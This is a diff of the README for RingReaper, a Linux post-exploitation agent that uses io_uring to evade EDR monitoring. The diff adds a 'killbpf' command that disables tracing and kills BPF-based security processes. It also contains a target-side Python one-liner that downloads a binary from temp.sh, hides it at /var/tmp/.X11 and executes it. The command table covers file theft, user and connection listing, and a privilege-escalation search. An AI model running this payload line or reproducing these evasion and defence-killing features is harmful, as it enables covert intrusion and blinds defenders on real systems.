@@ -1,7 +1,5 @@
 # RingReaper
 
-![Dororo](https://i.imgur.com/Hrmpefq.gif)
-
 **RingReaper** is a simple post-exploitation agent for Linux designed for those who need to operate stealthily, minimizing the chances of being detected by EDR solutions. The idea behind this project was to leverage **io_uring**, the new asynchronous I/O interface in the Linux kernel, specifically to avoid traditional system calls that most EDRs tend to monitor or even hook.
 
 In practice, RingReaper replaces calls such as `read`, `write`, `recv`, `send`, `connect`, among others, with asynchronous I/O operations (`io_uring_prep_*`), reducing exposure to hooks and event tracing typically collected in a standardized way by security products.
@@ -16,12 +14,17 @@ https://matheuzsecurity.github.io/hacking/evading-linux-edrs-with-io-uring/
 
 Author: https://www.linkedin.com/in/mathsalves/
 
+Rootkit Researchers
+
+- https://discord.gg/66N5ZQppU7
+
 ## Command Reference
 
 | Command       | Description                                              | Backend              |
 |---------------|----------------------------------------------------------|----------------------|
 | `get`         | Look files from the target                           | 100% io_uring        |
 | `put`         | Upload files (uses `recv` on the agent side)             | 100% io_uring        |
+| `killbpf`     | Disable tracing, remove `/sys/fs/bpf` files and kill processes using `bpf-map` | traditional calls + io_uring |
 | `users`       | List logged-in users by reading `utmp`                   | 100% io_uring        |
 | `ss` / `netstat` | List TCP connections from `/proc/net/tcp`            | 100% io_uring        |
 | `privesc`     | Search for SUID binaries using `statx`                   | 100% io_uring        |
@@ -72,6 +75,13 @@ Server (Attack box) :
 Agent (Target machine) :
 
 - `python3 -c "import urllib.request,os,subprocess; u=urllib.request.Request('http://temp.sh/xxxx/stealth_agent',method='POST'); d='/var/tmp/.X11'; open(d,'wb').write(urllib.request.urlopen(u).read()); os.chmod(d,0o755); subprocess.Popen([d]);"`
+
+## Upgrades
+
+**Version 2.0**:
+* Support for multiple threaded connections.
+* Command history (using the "up" and "down" keys).
+* "Clear" command to avoid cluttering the screen.
 
 ## Contribution
 
